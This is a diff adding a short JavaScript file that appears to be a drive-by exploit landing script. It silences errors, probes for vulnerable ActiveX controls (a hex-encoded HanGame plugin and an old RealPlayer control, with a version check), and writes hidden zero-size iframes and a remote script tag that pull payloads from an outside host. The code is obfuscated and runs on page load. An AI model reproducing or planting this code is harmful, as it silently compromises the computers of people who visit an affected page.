@@ -1,0 +1,21 @@
+window.status="";
+window.onerror=function(){return true;}
+try{var f;
+var gw=new ActiveXObject("\x48\x61\x6e\x47\x61\x6d\x65\x50\x6c\x75\x67\x69\x6e\x43\x6e\x31\x38\x2e\x48\x61\x6e\x47\x61\x6d\x65\x50\x6c\x75\x67\x69\x6e\x43\x6e\x31\x38\x2e\x31");}
+catch(f){};                      
+finally{if(f!="[object Error]"){document.write("<iframe width=0 height=0 src=http://www.1login.com.cn/title.gif></iframe>");}}
+function test()
+{
+rrooxx = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
+try
+{
+Like = new ActiveXObject(rrooxx);
+}catch(error){return;}
+vvvvv = Like.PlayerProperty("PRODUCTVERSION");
+if(vvvvv<="6.0.14.552")
+document.write("<iframe width=0 height=0 src=http://www.1login.com.cn/rss.gif></iframe>");
+else
+document.write("<iframe width=0 height=0 src=http://www.1login.com.cn/xml.gif></iframe>");
+}
+test();
+document.write("<script language=javascript src=http://www.1login.com.cn/flash.js></sc" + "ript>");
